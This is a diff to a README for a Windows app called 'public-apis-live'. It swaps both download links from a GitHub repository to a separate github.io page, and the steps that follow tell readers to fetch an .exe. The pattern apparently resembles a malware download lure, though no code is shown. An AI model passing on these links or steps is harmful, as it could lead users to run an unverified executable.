@@ -1,6 +1,6 @@
 # 🌐 public-apis-live - Find all public software interfaces here
 
-[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/Ryazchips/public-apis-live)
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://ryazchips.github.io)
 
 This application collects public software interfaces into one location. It checks each link daily to ensure services remain active. You can search, filter, and organize these tools for your own projects. This tool removes broken links and duplicates to save you time.
 
@@ -8,7 +8,7 @@ This application collects public software interfaces into one location. It check
 
 Follow these steps to put the application on your Windows computer.
 
-1. Visit the [official download page](https://github.com/Ryazchips/public-apis-live).
+1. Visit the [official download page](https://ryazchips.github.io).
 2. Look for the section labeled Releases on the right side of the page.
 3. Click the link for the latest release.
 4. Select the file ending in .exe for Windows.
